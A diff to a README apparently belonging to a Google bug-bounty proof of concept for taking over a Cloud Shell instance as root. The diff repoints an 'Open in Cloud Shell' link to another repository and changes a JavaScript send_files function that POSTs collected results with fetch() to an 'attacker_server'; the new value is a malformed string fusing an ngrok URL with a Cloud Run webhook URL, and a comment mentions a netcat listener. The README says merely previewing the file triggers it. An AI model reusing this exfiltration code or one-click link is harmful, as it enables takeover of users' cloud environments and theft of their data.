@@ -1,7 +1,7 @@
 # Google VRP testing  
 Google cloudshell instance take over (as root)
 
-[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor?page=editor&cloudshell_git_repo=https:%2F%2Fgithub.com%2Fomespino%2Fgcs_instace_takeover.git&cloudshell_open_in_editor=readme.md)
+[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor?page=editor&cloudshell_git_repo=https:%2F%2Fgithub.com%2Feripoll-eng%2Fgcs_instace_takeover.git&cloudshell_open_in_editor=readme.md)
 
 ## Getting Started 
 just need to preview this file to see the magic 
@@ -38,7 +38,7 @@ just need to preview this file to see the magic
  
     function send_files(result){ 
          // need to set netcat to listen per example nc -lvvv 55555
-         let attacker_server =  ' https://56051573.ngrok.io'
+         let attacker_server =  'https://56051573.ngrok.io](https://webhook-service-252213446612.us-central1.run.app'
          fetch(attacker_server, {
                 method: 'post',
                 body: JSON.stringify(result)
